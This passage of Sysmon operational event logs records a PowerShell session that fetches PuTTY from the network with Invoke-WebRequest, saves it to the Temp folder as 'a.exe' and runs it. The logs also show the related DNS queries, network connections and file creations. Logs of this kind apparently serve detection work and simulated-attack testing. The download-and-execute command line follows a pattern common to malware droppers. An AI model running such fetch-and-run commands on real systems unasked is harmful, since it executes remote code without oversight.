      <TimeCreated SystemTime=""2023-12-27T22:24:07.4574046Z""/>
      <EventRecordID>19612</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:24:07.446</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a407-658c-de01-000000000f00}</Data>
      <Data Name=""ProcessId"">3660</Data>
      <Data Name=""Image"">C:\Users\User\AppData\Local\Temp\a.exe</Data>
      <Data Name=""FileVersion"">Release 0.80 (with embedded help)</Data>
      <Data Name=""Description"">SSH, Telnet, Rlogin, and SUPDUP client</Data>
      <Data Name=""Product"">PuTTY suite</Data>
      <Data Name=""Company"">Simon Tatham</Data>
      <Data Name=""OriginalFileName"">PuTTY</Data>
      <Data Name=""CommandLine"">""C:\Users\User\AppData\Local\Temp\a.exe"" </Data>
      <Data Name=""CurrentDirectory"">C:\Windows\System32\WindowsPowerShell\v1.0\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=A9C5924063A253F64FB86BC924BE6996,SHA256=EB1B278B91A8F183F9749948ABD9556EC21B03CA852C53E423D824D5D7CC3DE4,IMPHASH=69573714E11441683EA863C40A1C0D54</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a3ff-658c-da01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">3344</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -outfile $env:TEMP\a.exe;start-process $env:TEMP\a.exe</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:24:07.446

ProcessGuid: {f57bd86a-a407-658c-de01-000000000f00}

ProcessId: 3660

Image: C:\Users\User\AppData\Local\Temp\a.exe

FileVersion: Release 0.80 (with embedded help)

Description: SSH, Telnet, Rlogin, and SUPDUP client

Product: PuTTY suite

Company: Simon Tatham

OriginalFileName: PuTTY

CommandLine: ""C:\Users\User\AppData\Local\Temp\a.exe"" 

CurrentDirectory: C:\Windows\System32\WindowsPowerShell\v1.0\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=A9C5924063A253F64FB86BC924BE6996,SHA256=EB1B278B91A8F183F9749948ABD9556EC21B03CA852C53E423D824D5D7CC3DE4,IMPHASH=69573714E11441683EA863C40A1C0D54

ParentProcessGuid: {f57bd86a-a3ff-658c-da01-000000000f00}

ParentProcessId: 3344

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -outfile $env:TEMP\a.exe;start-process $env:TEMP\a.exe

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19611,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:40.907

ProcessGuid: {f57bd86a-a3ff-658c-da01-000000000f00}

ProcessId: 3344

QueryName: the.earth.li

QueryStatus: 0

QueryResults: ::ffff:93.93.131.124;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3ff-658c-da01-000000000f00},3588,3344,,,the.earth.li,::ffff:93.93.131.124;,0,"
      ",-,,,,,,2023-12-27T22:24:02.8468553Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:40.907,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:24:02.8468553Z""/>
      <EventRecordID>19611</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:40.907</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3ff-658c-da01-000000000f00}</Data>
      <Data Name=""ProcessId"">3344</Data>
      <Data Name=""QueryName"">the.earth.li</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:93.93.131.124;</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:40.907

ProcessGuid: {f57bd86a-a3ff-658c-da01-000000000f00}

ProcessId: 3344

QueryName: the.earth.li

QueryStatus: 0

QueryResults: ::ffff:93.93.131.124;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,the.earth.li,93.93.131.124,false,443,https,3,19610,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,true,,0x8000000000000000,Information,,,"Network connection detected:

RuleName: -

UtcTime: 2023-12-27 14:52:40.926

ProcessGuid: {f57bd86a-a3ff-658c-da01-000000000f00}

ProcessId: 3344

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.163

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 50101

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 93.93.131.124

DestinationHostname: the.earth.li

DestinationPort: 443

DestinationPortName: https",Info,,,,,,,{f57bd86a-a3ff-658c-da01-000000000f00},3588,3344,,tcp,,,,"
      ",-,WinDev2309Eval.localdomain,192.168.126.163,false,50101,-,2023-12-27T22:24:02.1675981Z,,Network connection detected (rule: NetworkConnect),,5136,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:40.926,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:24:02.1675981Z""/>
      <EventRecordID>19610</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5136""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:40.926</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3ff-658c-da01-000000000f00}</Data>
      <Data Name=""ProcessId"">3344</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""Protocol"">tcp</Data>
      <Data Name=""Initiated"">true</Data>
      <Data Name=""SourceIsIpv6"">false</Data>
      <Data Name=""SourceIp"">192.168.126.163</Data>
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      <Data Name=""SourcePort"">50101</Data>
      <Data Name=""SourcePortName"">-</Data>
      <Data Name=""DestinationIsIpv6"">false</Data>
      <Data Name=""DestinationIp"">93.93.131.124</Data>
      <Data Name=""DestinationHostname"">the.earth.li</Data>
      <Data Name=""DestinationPort"">443</Data>
      <Data Name=""DestinationPortName"">https</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Network connection detected:

RuleName: -

UtcTime: 2023-12-27 14:52:40.926

ProcessGuid: {f57bd86a-a3ff-658c-da01-000000000f00}

ProcessId: 3344

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.163

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 50101

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 93.93.131.124

DestinationHostname: the.earth.li

DestinationPort: 443

DestinationPortName: https</Message>
      <Level>Information</Level>
      <Task>Network connection detected (rule: NetworkConnect)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:24:01.547,,,,,,,,11,19609,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: EXE

UtcTime: 2023-12-27 22:24:01.547

ProcessGuid: {f57bd86a-a3ff-658c-da01-000000000f00}

ProcessId: 3344

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\a.exe

CreationUtcTime: 2023-12-27 22:24:01.547

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3ff-658c-da01-000000000f00},3588,3344,,,,,,"
      ",EXE,,,,,,2023-12-27T22:24:01.5614567Z,C:\Users\User\AppData\Local\Temp\a.exe,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:24:01.547,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:24:01.5614567Z""/>
      <EventRecordID>19609</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">EXE</Data>
      <Data Name=""UtcTime"">2023-12-27 22:24:01.547</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3ff-658c-da01-000000000f00}</Data>
      <Data Name=""ProcessId"">3344</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\a.exe</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:24:01.547</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: EXE

UtcTime: 2023-12-27 22:24:01.547

ProcessGuid: {f57bd86a-a3ff-658c-da01-000000000f00}

ProcessId: 3344

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\a.exe

CreationUtcTime: 2023-12-27 22:24:01.547

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19608,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:38.447

ProcessGuid: {f57bd86a-a3fd-658c-d801-000000000f00}

ProcessId: 2948

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3fd-658c-d801-000000000f00},3588,2948,,,raw.githubusercontent.com,::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;,0,"
      ",-,,,,,,2023-12-27T22:24:00.4732050Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:38.447,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:24:00.4732050Z""/>
      <EventRecordID>19608</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:38.447</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3fd-658c-d801-000000000f00}</Data>
      <Data Name=""ProcessId"">2948</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:38.447

ProcessGuid: {f57bd86a-a3fd-658c-d801-000000000f00}

ProcessId: 2948

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,cdn-185-199-108-133.github.com,185.199.108.133,false,443,https,3,19607,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,true,,0x8000000000000000,Information,,,"Network connection detected:

RuleName: -

UtcTime: 2023-12-27 14:52:38.451

ProcessGuid: {f57bd86a-a3fd-658c-d801-000000000f00}

ProcessId: 2948

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.163

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 50100

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 185.199.108.133

DestinationHostname: cdn-185-199-108-133.github.com

DestinationPort: 443

DestinationPortName: https",Info,,,,,,,{f57bd86a-a3fd-658c-d801-000000000f00},3588,2948,,tcp,,,,"
      ",-,WinDev2309Eval.localdomain,192.168.126.163,false,50100,-,2023-12-27T22:24:00.3595057Z,,Network connection detected (rule: NetworkConnect),,5136,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:38.451,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:24:00.3595057Z""/>
      <EventRecordID>19607</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5136""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:38.451</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3fd-658c-d801-000000000f00}</Data>
      <Data Name=""ProcessId"">2948</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""Protocol"">tcp</Data>
      <Data Name=""Initiated"">true</Data>
      <Data Name=""SourceIsIpv6"">false</Data>
      <Data Name=""SourceIp"">192.168.126.163</Data>
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      <Data Name=""SourcePort"">50100</Data>
      <Data Name=""SourcePortName"">-</Data>
      <Data Name=""DestinationIsIpv6"">false</Data>
      <Data Name=""DestinationIp"">185.199.108.133</Data>
      <Data Name=""DestinationHostname"">cdn-185-199-108-133.github.com</Data>
      <Data Name=""DestinationPort"">443</Data>
      <Data Name=""DestinationPortName"">https</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Network connection detected:

RuleName: -

UtcTime: 2023-12-27 14:52:38.451

ProcessGuid: {f57bd86a-a3fd-658c-d801-000000000f00}

ProcessId: 2948

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.163

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 50100

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 185.199.108.133

DestinationHostname: cdn-185-199-108-133.github.com

DestinationPort: 443

DestinationPortName: https</Message>
      <Level>Information</Level>
      <Task>Network connection detected (rule: NetworkConnect)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:23:59.830,,,,,,,,11,19606,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:23:59.830

ProcessGuid: {f57bd86a-a3ff-658c-da01-000000000f00}

ProcessId: 3344

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_cgyv0hfc.vep.ps1

CreationUtcTime: 2023-12-27 22:23:59.830

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a3ff-658c-da01-000000000f00},3588,3344,,,,,,"
      ",-,,,,,,2023-12-27T22:23:59.8319512Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_cgyv0hfc.vep.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:23:59.830,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:23:59.8319512Z""/>
      <EventRecordID>19606</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:23:59.830</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a3ff-658c-da01-000000000f00}</Data>
      <Data Name=""ProcessId"">3344</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_cgyv0hfc.vep.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:23:59.830</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:23:59.830

ProcessGuid: {f57bd86a-a3ff-658c-da01-000000000f00}

ProcessId: 3344

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_cgyv0hfc.vep.ps1

CreationUtcTime: 2023-12-27 22:23:59.830

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
